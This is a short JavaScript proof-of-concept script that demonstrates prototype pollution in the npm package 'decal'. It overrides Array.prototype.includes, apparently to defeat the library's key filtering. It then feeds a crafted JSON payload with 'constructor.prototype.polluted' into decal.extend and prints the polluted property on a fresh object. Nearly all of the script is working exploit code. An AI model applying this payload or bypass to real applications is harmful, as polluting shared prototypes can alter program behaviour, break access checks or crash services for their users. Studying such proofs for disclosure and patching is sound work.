Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const decal = require('decal');
console.log({}.polluted);
const o = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
decal.extend({}, true, o);
console.log({}.polluted);